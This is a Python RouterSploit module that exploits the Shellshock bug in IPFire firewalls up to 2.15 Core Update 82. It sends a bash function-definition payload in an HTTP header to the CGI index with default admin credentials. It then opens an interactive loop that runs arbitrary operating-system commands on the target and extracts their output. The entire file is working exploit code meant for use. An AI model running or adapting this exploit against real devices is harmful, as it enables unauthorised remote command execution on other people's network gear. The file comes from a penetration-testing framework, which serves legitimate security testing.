from routersploit import (
    exploits,
    print_status,
    print_error,
    print_success,
    print_info,
    random_text,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Shellshock vulnerability in IPFire <= 2.15 Core Update 82.
    If the target is vulnerable it allows to execute command on operating system level.
    """
    __info__ = {
        'name': 'IPFire Shellshock',
        'description': 'Exploits shellshock vulnerability in IPFire M= 2.15 Core Update 82.'
                       'If the target is vulnerable it is possible to execute commands on operating system level.',
        'authors': [
            'Claudio Viviani',  # vulnerability discovery
            'Marcin Bury <marcin.bury@reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'https://www.exploit-db.com/exploits/34839',
        ],
        'devices': [
            'IPFire <= 2.15 Core Update 82',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(444, 'Target port')  # default port

    username = exploits.Option('admin', 'Username to log in with')
    password = exploits.Option('admin', 'Password to log in with')

    payload = "() { :;}; /bin/bash -c '{{cmd}}'"

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            print_status("Invoking command loop...")
            self.command_loop()
        else:
            print_error("Target is not vulnerable")

    def command_loop(self):
        while 1:
            cmd = raw_input("cmd > ")

            if cmd in ['exit', 'quit']:
                return

            print_info(self.execute(cmd))

    def execute(self, cmd):
        url = "{}:{}/cgi-bin/index.cgi".format(self.target, self.port)

        marker = random_text(32)
        cmd = "echo {};{};echo{}".format(marker, cmd, marker)
        payload = self.payload.replace("{{cmd}}", cmd)

        headers = {
            'VULN': payload,
        }

        response = http_request(method="GET", url=url, headers=headers, auth=(self.username, self.password))
        if response is None:
            return ""

        if response.status_code == 200:
            start = response.text.find(marker) + len(marker) + 1  # marker and whitespace
            end = response.text.find(marker, start) - 48

            return response.text[start:end]

        return ""

    @mute
    def check(self):
        url = "{}:{}/cgi-bin/index.cgi".format(self.target, self.port)

        marker = random_text(32)
        cmd = "echo {}".format(marker)
        payload = self.payload.replace("{{cmd}}", cmd)

        headers = {
            'VULN': payload,
        }

        response = http_request(method="GET", url=url, headers=headers, auth=(self.username, self.password))
        if response is None:
            return False  # target is not vulnerable

        if response.status_code == 200 and marker in response.text:
            return True  # target is vulnerable

        return False  # target is not vulnerable
